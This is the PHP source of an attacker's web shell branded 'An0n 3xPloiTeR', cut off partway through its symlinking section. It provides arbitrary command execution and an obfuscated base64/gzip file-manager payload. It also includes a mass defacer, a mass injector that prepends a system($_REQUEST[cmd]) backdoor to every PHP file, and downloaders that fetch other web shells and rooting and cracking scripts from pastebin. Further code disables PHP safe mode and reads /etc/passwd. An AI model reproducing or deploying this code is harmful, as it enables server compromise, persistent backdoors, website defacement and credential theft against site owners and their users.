<!DOCTYPE html>
<html>
	<head>
		<title> Shell By An0n 3xPloiTeR</title>
		<meta charset="UTF-8" />
		<meta name="description" content="This  Shell is Designed By An0n 3xPloiTeR" />
		<meta name="note" content="Changing The Names Wont Make You The Author :)" />
		<meta http-equiv="refresh" content=""><!-- For Refreshing Page After 3600 Intervals of time -->
		<meta name="about" content="Use it where other shells dont work" />
        <meta name="author" content="An0n 3xPloiTeR,Umar Arfeen Shah" />
        <meta name="keywords" content="An0n 3xPloiTeR, Shell,Shell,An0n,3xPloiTeR, Shell By An0n 3xPloiTeR, Shell" />
		<meta name="revisit-after" content="1800" />
		<meta name="language" content="en" />
		<meta content='general' name='rating' />
		<meta content='google' name='generator' />
		<meta content='follow,all' name='msnbot' />
		<meta content='follow,all' name='alexabot' />
		<meta content='pakistan' name='geo.placename' />
		<meta content="index,follow,all" name="googlebot" />
		<meta http-equiv="X-UA-Compatible" content="IE-edge" />
		<link rel="SHORTCUT ICON" href="http://i.imgur.com/Ix3lhWm.jpg" />
		<meta name="viewport" content="width=device-width, initial-scale=1" />
		<meta name='search engines' content='Aeiwi,Alexa,AllTheWeb,AltaVista,AOLNetfind,Anzwers,Canada,DirectHit,EuroSeek,Excite,Overture,Go,Google,HotBot InfoMak,Kanoodle,Lycos,MachineSite,National Directory,Northern Light,SearchIt,SimpleSearch,WebsMostLinked,WebTop,What-U-Seek,AOL,Yahoo,WebCrawler,Infoseek,Excite,Magellan,LookSmart,bing,CNET,Googlebot' />
		<?php error_reporting(0); ?>
		<style>
			body {
				background-color: #080510;
			}
			.heading {
				text-align: center;
				font-size: 300%;
				font-family: cursive;
				color: red;
			}
			.buttons {
				margin-top: 2vh;
			}
			input {
				color: white;
				text-align: center;
				font-weight: bold; 
				font-family: cursive;
				border-left: #080510;
				border-right: #080510;
				border-style: groove;
				background-color: #080510; 
				font-size: 110%;
			}
			select {
				color: white;
				text-align: center;
				font-weight: bold; 
				font-family: cursive;
				border-left: black;
				border-right: black;
				border-style: groove;
				background-color: black;
			}
			option {
				color: white;
				text-align: center;
				font-weight: bold; 
				font-family: cursive;
				border-left: #080510;
				border-right: #080510;
				border-style: groove;
				background-color: #080510; 
			}
			textarea {
				color: white;
				font-weight: bold; 
				font-family: cursive;
				border-left: #080510;
				border-right: #080510;
				border-style: groove;
				background-color: #080510; 
			}
			iframe {
				color: white;
				font-weight: bold; 
				font-family: cursive;
				border-left: #080510;
				border-right: #080510;
				border-style: groove;
				background-color: #080510; 
			}
			a {
				text-decoration: none;
				color: white;
			}
			a:hover {
				text-decoration: none;
				color: teal;
			}
			.footer {
				position: fixed;
				left: 0px;
				right: 0px;
				bottom: 1vh;
				color: red;
				font-family: cursive;
				font-size: 160%;
				text-align: center;
			}
			.def {
				font-family: cursive;
				font-size: 100%;
				color: white;
			}
		</style>
	</head>
	<body>
		<div class="heading">
			<font>An0n 3xPloiTeR Shell</font><br>
		</div>
		<div class="buttons"><center>
			<a href="?server_info">
				<input type="submit" value="Server Info" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?file_manager">
				<input type="submit" value="File Manager" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?file_creator">
				<input type="submit" value="File Creator" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?cgi_shell">
				<input type="submit" value="CGI Shell" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?php_info">
				<input type="submit" value="Php Info" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?exec">
				<input type="submit" value="<?php 
				if(strtolower(substr(PHP_OS,0,3)) == "win") {$os = 'win';}else {$os = 'nix';}if($os == 'nix'){echo 'CMD';} else {echo 'Terminal'; } ?>" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?defacer">
				<input type="submit" value="Defacer" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?mass_injector">
				<input type="submit" value="Code Injector" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?uploader">
				<input type="submit" value="Uploader" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?shells">
				<input type="submit" value="Shells" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?scripts">
				<input type="submit" value="Scripts" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?symlink">
				<input type="submit" value="Symlinker" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?wp_title">
				<input type="submit" value="Wp Title" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?domains">
				<input type="submit" value="Domains" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?back_connecter">
				<input type="submit" value="Back Connecter" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?die">
				<input type="submit" value="Die" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			</center>
			<?php
					if (isset($_GET['server_info'])) {
					?>
						<center><br><br>
						<font style="color: red; font-family: cursive; font-size: 130%;">Uname: <?php echo php_uname(); ?></font><br>
						<font style="color: silver; font-family: cursive; font-size: 130%;">Browser: <?php echo $_SERVER['HTTP_USER_AGENT']; ?></font><br>
						<font style="color: lawngreen; font-family: cursive; font-size: 130%;">Server Software: <?php echo $_SERVER['SERVER_SOFTWARE']; ?> </font><br>
						<font style="color: red; font-family: cursive; font-size: 130%;">Server IP: <?php echo $_SERVER['SERVER_ADDR']; ?></font><br>
						<font style="color: lawngreen; font-family: cursive; font-size: 130%;">User IP: <?php echo $_SERVER['REMOTE_ADDR']; ?></font><br>
						<font style="color: red; font-family: cursive; font-size: 130%;">User: <?php echo @get_current_user(); ?></font><br>
						<font style="color: red; font-family: cursive; font-size: 130%;">Safe Mode:&nbsp;<?php $safe_mode = ini_get('safe_mode'); if ($safe_mode == 1) { echo '<span style="color: red;">On';} else {echo '<span style="color: lawngreen;">Off</span>';}?>
						</font><br>
						<font style="color: lawngreen; font-family: cursive; font-size: 130%;">Domains: <?php if(strtolower(substr(PHP_OS,0,3)) == "win") {$os = 'win';}else {$os = 'nix';}if($os == 'nix') {$doos = @file_get_contents("/etc/named.conf");if(!$doos) {$DomainS = "/var/named";$Domainonserver = scandir($DomainS);$d0c = count($Domainonserver);} else {@preg_match_all('/.*?zone "(.*?)" {/', $doos, $out);$out = sizeof(array_unique($out[1])); $d0c = $out."  Domains";}} else {$d0c = "1";} echo $d0c; }?>
					</center></font></center>
			<?php
			if (isset($_GET['file_manager'])) {
				$file_manager = "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";
				$writing = @fopen('file.php', "w");
				@fwrite($writing, htmlspecialchars_decode(gzinflate(base64_decode($file_manager))));
				@fclose($writing);
				?><br><br>
				<iframe src="file.php" width="100%" height="515"></iframe>
				<?php
			}
			?>
			<?php
				if (isset($_GET['file_creator'])) {
					?>
					<center><br><br>
					<form action="" method="POST">
						<font color="white" face="cursive" size="">Filename: </font>
						<input type="text" name="file_name" placeholder="File Name Here" /><br><br>
						<font color="white" face="cursive" size="">Content: </font><br>
						<textarea name="content_of_files" rows="10" cols="90"></textarea><br><br>
						<input type="submit" name="submissionoffilecreator" value="Submit" />
					</form>
					<?php
						$filename_in_file_creator = htmlspecialchars($_POST['file_name']);
						$contents_of_file = $_POST['content_of_files'];

					if (isset($_POST['file_name']) || isset($_POST['content_of_files']) || isset($_POST['submissionoffilecreator'])) {
						if (!empty($filename_in_file_creator) || !empty($contents_of_file)) {
						$handle = @fopen($filename_in_file_creator, 'w');
						@fwrite($handle, $contents_of_file);
						@fclose($handle);
						?><br><br>
						<font color="white" face="cursive" size="5">File With Name: <a href="<?php echo $filename_in_file_creator; ?>" target="_blank"><?php echo $filename_in_file_creator; ?></a> is created</font>
						<?php 
						} else {
							?><br><br>
							<font color="white" face="cursive" size="5">Please Input In All Fields :P</font>
						<?php
						}
					}
				}
			?>
			<?php
				if (isset($_GET['php_info'])) {
						?>
					<body style="color: black; background-color: #080510;">
					<font style="background-color: black; color: black;">
					<?php phpinfo(); echo '<br><br>';}?>
					<?php 
			?>
			<?php
				if (isset($_GET['file_creator'])) {
					?>
					<center><br><br>
					<form action="" method="POST">
						<font color="white" face="cursive" size="">Filename: </font>
						<input type="text" name="file_name" placeholder="File Name Here" /><br><br>
						<font color="white" face="cursive" size="">Content: </font><br>
						<textarea name="content_of_files" rows="10" cols="90"></textarea><br><br>
						<input type="submit" name="submissionoffilecreator" value="Submit" />
					</form>
					<?php
						$filename_in_file_creator = $_POST['file_name'];
						$contents_of_file = $_POST['content_of_files'];

					if (isset($_POST['file_name']) || isset($_POST['content_of_files']) || isset($_POST['submissionoffilecreator'])) {
						if (!empty($filename_in_file_creator) || !empty($contents_of_file)) {
						$handle = @fopen($filename_in_file_creator, 'w');
						@fwrite($handle, $contents_of_file);
						@fclose($handle);
						?><br><br>
						<font color="white" face="cursive" size="5">File With Name: <a href="<?php echo $filename_in_file_creator; ?>" target="_blank"><?php echo $filename_in_file_creator; ?></a> is created</font>
						<?php 
						} else {
							?><br><br>
							<font color="white" face="cursive" size="5">Please Input In All Fields :P</font>
							<?php
								}
							}
						}
					?>
					<?php
						if (isset($_GET['cgi_shell'])) {
							 ?>
							 <center><br><font style="color: white; font-family: cursive; font-size: 200%;">CgiTelNet</font><br><span class="def">Password: umar</span><br>
							<?php
							                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
					?>
					<?php
						if (isset($_GET['exec'])) {
							?><center><br><span class="def">Commands:</span>
							<form action="" method="POST">
								<textarea rows="8" cols="70" name="command" placeholder="Commands Here"></textarea><br><br>
								<input type="submit" name="submit" value="Submit">
							</form>
							<?php
							if (!empty($_POST['command']) && isset($_POST['submit'])) {
								function execute($in) {
							    $out = '';
							    if(function_exists('exec')) {
							        @exec($in,$out);
							        $out = @join("\n",$out);
							    }elseif(function_exists('passthru')) {
							        ob_start();
							        @passthru($in);
							        $out = ob_get_clean();
							    }elseif(function_exists('system')) {
							        ob_start();
							        @system($in);
							        $out = ob_get_clean();
							    }elseif(function_exists('shell_exec')) {
							        $out = shell_exec($in);
							    }elseif(is_resource($f = @popen($in,"r"))) {
							        $out = "";
							        while(!@feof($f))
							            $out .= fread($f,1024);
							        pclose($f);
							    }
							    return $out;
							}
								$commands = $_POST['command'];
								$result = @execute($commands);
								echo '<br><textarea rows="8" cols="70">'.$result.'</textarea>';
							}
						}
					?>
					<?php
					if (isset($_GET['defacer'])) {
						?>
							<center><br><font style="font-family: cursive; font-size: 170%; color: red;">An0n 3xPloiTeR Mass Defacer </font><br>
							<form ENCTYPE="multipart/form-data" action="" method=POST onSubmit="g(null,null,this.path.value,this.file.value,this.Contents.value);return false;"><span class="def">Folder:</span> <br><input type="text" name="path" size="60" value="<?php echo getcwd(); ?>">
							<br><span class="def">File name:</span> <br><input type="text" name="file" size="20" value="Pakistan_Zindabad.html"><br><span class="def">Content:</span>
							<br> <textarea type='text' name='Contents' cols="60" rows="8" placeholder="Deface Page Here :)"></textarea> 
							<br><input type=submit name="submit" value="Deface now"></p></form>
							<?php
							if (isset($_POST['path']) && !empty($_POST['file']) && !empty($_POST['Contents']) && isset($_POST['submit'])) {
								$mainpath = $_POST["path"];
								$file = $_POST["file"];
								$txtContents = $_POST["Contents"];
								$dir = opendir($mainpath);
								while ($row = readdir($dir)) {
								$start = @fopen("$row/$file", "w+");
								$code = $txtContents;
								$finish = @fwrite($start, $code);
								if ($finish) {
								echo "<span class='def'>http://$row/$file</span><br>";
								}
							}
						}
					}
					?>
					<?php
						if (isset($_GET['mass_injector'])) {
							?><br><center><br>
							<font style="color: teal; font-family: cursive; font-size: 200%;">ReV Mass Code Injector V2.0</font><br><br>
							<form action="" method="POST">
			<?php
				$console = '
<?php
if (isset($_REQUEST[cmd])) {
system ($_REQUEST[cmd]);
}
?>';
			?>
				<textarea type="text" name="code" rows="13" cols="80" placeholder="Enter Your Code Like This : <?php echo $console; ?>"></textarea><br><br>
				<input style="font-family: Comic Sans Ms; font-size: 90%;" type="submit" name="submit" value="Submit" />
			</form>
			<?php
				if (isset($_POST['submit'])) {
					$code = $_POST['code'];
					$code1 = base64_encode($code);
					$path = getcwd();
					$host = 'http://'.$_SERVER['HTTP_HOST'];
					$path_of_file = $_SERVER['SCRIPT_NAME'];
					$website_testing = $host.$path_of_file;
					$path = getcwd();
					$directory = $path;

					if (empty($code)) {
						echo '<font size=\'50%\' face=\'cursive\' color=\'red\'>You need to input something !!! :P</font>';
					}

					if (!empty($code)) {

							if ($handle = opendir($directory)) {
							echo '<span style="color: red; font-family: cursive; font-size: 110%;">'.'Website: '.$website_testing.'<br><br></span>';
							echo '<span style="color: teal; font-family: cursive; font-size: 110%;">Looking in '.$directory.'<br></span>';
							while ($files = readdir($handle)) {
								if ($files != '.' && $files != '..' && $files != 'rev.php' && $files != 'REV.php' && $files != '.htaccess' && $files != 'php.ini' && $files != 'admin' && $files != 'images' && $files != 'image' && $files != 'img' && $files != 'phpmyadmin' && $files != 'files' && $files != '.ftpquota' && $files != '.error_log' && strtolower(substr($files, strrpos($files, '.') + 1)) == 'php') {
								echo '<a style="color: red; font-family: cursive;" target="_blank" href="'.$files.'">'.$files.'</a><font size="" color="lawngreen" face="cursive">&nbsp;&nbsp;&nbsp&nbsp;Is Injected</font><br />';
								$file_data = base64_decode($code1);
								$file_data .= file_get_contents($files);
								file_put_contents($files, $file_data); echo '<br>';
								} 
							}
						}
					}
				}
			}
		?>
		<?php
			if (isset($_GET['uploader'])) {
				?>
				<center><br><br>
				<font style="color: lawngreen; font-family: cursive; font-size: 250%;">An0n 3xPloiTeR's Uploader</font><br><br><br><br>
				<form method="POST" enctype="multipart/form-data" action="">
					<input style="font-size: 90%;" type="file" name="files">
					<input style="font-size: 90%;" type=submit value="Upload">
				</form>
				<?php
				$files = @$_FILES["files"];
				if ($files["name"] != '') {
				    $fullpath = $_REQUEST["path"] . $files["name"];
				    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
				        echo "<center><br><br><font style='color: red; font-family: cursive; font-size: 200%;'><a href='$fullpath' target='_blank'>Click to access uploaded File</a></font></center>";
				    }
				}
			}
		?>
		<?php
			if (isset($_GET['shells'])) {
				?>
				<center><br><font style="color: red; font-size: 200%; font-family: cursive;">Shells By An0n 3xPloiTeR</font></center><div class="content">
					<br>
					<table border="1%" align="center" cellpadding="10">
					<tr>
					<td><font style="color: teal; font-family: cursive; font-size: 120%;">Click And Get The Shells</font></td>
					<tr><td>
					<form action="" method="post"> 
					<input type = "submit" name="dhanush" value ="Dhanush Shell">
					</td></tr>
					<tr><td>
					<form action="" method="post">
					<input type = "submit" name="anonghosts" value ="AnonGhosts Shell"></td></tr>
					<tr><td>
					<form action="" method="post">
					<input type = "submit" name="blackhat" value ="BlackHat Shell"></td></tr>
					<tr><td>
					<form action="" method="post">
					<input type = "submit" name="imageshell" value ="An0n 3xPloiTeR Image Shell"></td></tr>
					<tr><td>
					<form action="" method="post">
					<input type = "submit" name="madspot" value ="Madspot Shell"></td></tr>
					<tr><td>
					<form action="" method="post">
					<input type = "submit" name="pcd" value ="Pak Cyber Defenders Shell"></td></tr>
					<tr><td>
					<form action="" method="post">
					<input type = "submit" name="cheta" value ="Kashimiri Cheetah Shell"></td></tr>
					<tr><td>
					<form action="" method="post">
					<input type = "submit" name="1337worm" value ="1337 Worm Shell"></td></tr>
					<tr><td>
					<form action="" method="post">
					<input type = "submit" name="b374k" value ="b374k Shell"></td></tr>
					<tr><td>
					<form action="" method="post">
					<input type = "submit" name="joker" value ="Joker Shell"></td></tr></div>
				<?php
				}
		?>

		<?php
			if (isset($_GET['scripts'])) {
				?>
				<center><br><font style="color: red; font-family: cursive; font-size: 200%;">Scripts By An0n 3xPloiTeR</font>
					</center><div class="content">
					<br>
					<table border="1%" align="center" cellpadding="10">
					<tr>
					<td><font style="color: teal; font-family: cursive; font-size: 120%;">Click And Get The Scripts</font></td>
					<tr><td>
					<form action="" method="post">
					<input type = "submit" name="symlink" value ="Symlinker"></td></tr>
					<tr><td>
					<form action="" method="post">
					<input type = "submit" name="anoncmd" value ="AnonGhosts Console"></td></tr>
					<tr><td>
					<form action="" method="post">
					<input type = "submit" name="madleets" value ="Madleets Console"></td></tr>
					<tr><td>
					<form action="" method="post">
					<input type = "submit" name="rooter" value ="Autorooting Perl Script"></td></tr>
					<tr><td>
					<form action="" method="post">
					<input type = "submit" name="cpc" value ="Control Panel Cracker"></td></tr></div>
				<?php

			}
		?>

		<?php

			function download($file_url, $save_to) {
        			$content = file_get_contents($file_url);
					file_put_contents($save_to, $content);
				}

		if (isset($_POST['dhanush'])) {
        download('http://pastebin.com/raw/FHs6uGki', realpath("./") . '/dhanush.php');
        header("location:dhanush.php");		} 

	if (isset($_POST['symlink'])) {
		download('http://pastebin.com/raw/hYGVf4qT', realpath("./") . '/symlink.php');
        header("location:symlink.php");		} 

    if (isset($_POST['madleets'])) {
		download('http://pastebin.com/raw/M9mx5j4h', realpath("./") . '/madleets.php');
        header("location:madleets.php");		} 

    if (isset($_POST['rooter'])) {
		download('http://pastebin.com/raw/sJxiRZAH', realpath("./") . '/rooter.php');
        header("location:rooter.php");		} 

    if (isset($_POST['cpc'])) {
		download('http://pastebin.com/raw/d73HhXBk', realpath("./") . '/cpc.php');
        header("location:cpc.php");		} 

	if (isset($_POST['anonghosts'])) {
		download('http://pastebin.com/raw/Cm3WsQXL', realpath("./") . '/anonghosts.php');
        header("location:anonghosts.php");		}

	if (isset($_POST['blackhat'])) {
		download('http://pastebin.com/raw/XFs2pPBM', realpath("./") . '/blackhat.php');
        header("location:blackhat.php");		} 

	if (isset($_POST['imageshell'])) {
		download('http://pastebin.com/raw/eTbTMB4y', realpath("./") . '/imageshell.php');
        header("location:imageshell.php");		} 

	if (isset($_POST['madspot'])) {
		download('http://pastebin.com/raw/mjKJRfXA', realpath("./") . '/madspot.php');
        header("location:madspot.php");		} 

    if (isset($_POST['pcd'])) { 
		download('http://pastebin.com/raw/cBiiU6MR', realpath("./") . '/pcd.php');
        header("location:pcd.php");		} 

    if (isset($_POST['cheta'])) { 
		download('http://pastebin.com/raw/H6ah5rnF', realpath("./") . '/cheta.php');
        header("location:cheta.php");		}


    if (isset($_POST['1337worm'])) { 
		download('http://pastebin.com/raw/7WwNgWHh', realpath("./") . '/1337worm.php');
        header("location:1337worm.php");		} 


    if (isset($_POST['joker']	)) { 
		download('http://pastebin.com/raw/eLT2PtZN', realpath("./") . '/joker.php');
        header("location:joker.php");		} 


    if (isset($_POST['b374k'])) { 
		download('http://pastebin.com/raw/UZuF1RKJ', realpath("./") . '/b374k.php');
        header("location:b374k.php");		}
		?>


		<?php
			if (isset($_GET['symlink'])) {
				$fp = fopen("php.ini", "w+");
				fwrite($fp, "safe_mode = OFF
					Safe_mode_gid = OFF
					disable_functions = NONE
					disable_classes = NONE
					open_basedir = OFF
					suhosin.executor.func.blacklist = NONE ");
				fclose($fp);
				if (empty($_POST['config'])) { ?><form method="POST"><textarea name="passwd" style="display:none;" class='area' rows='25' cols='80'><?php echo file_get_contents('/etc/passwd'); ?></textarea><br><br><center><br><font style="color: red; font-family: cursive; font-size: 200%;">An0n 3xPloiTeR   && AkDk Symlinker<br><br></font><br><input name="config" value="Php Symlinking" type="submit">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="submit" name="psymlink" value="Python Symlinking"><br></form></center><br>
				<?php
}

if (isset($_POST['psymlink'])) {
